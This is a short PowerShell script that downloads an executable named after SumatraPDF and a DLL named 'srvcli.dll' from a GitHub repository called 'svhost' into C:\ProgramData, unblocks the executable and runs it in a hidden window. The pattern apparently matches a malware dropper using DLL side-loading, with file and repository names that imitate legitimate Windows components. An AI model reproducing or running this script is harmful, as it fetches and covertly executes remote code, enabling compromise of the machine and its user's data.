$wc = New-Object System.Net.WebClient
$wc.DownloadFile("https://github.com/kenath98/svhost/raw/refs/heads/main/SumatraPDF-3.5.2-64.exe", "C:\ProgramData\SumatraPDF-3.5.2-64.exe")
$wc.DownloadFile("https://github.com/kenath98/svhost/raw/refs/heads/main/srvcli.dll", "C:\ProgramData\srvcli.dll")

Start-Sleep -Seconds 3  # Ensure files are fully downloaded
Unblock-File -Path "C:\ProgramData\SumatraPDF-3.5.2-64.exe"

Start-Process -FilePath "C:\ProgramData\SumatraPDF-3.5.2-64.exe" -WindowStyle Hidden -Wait
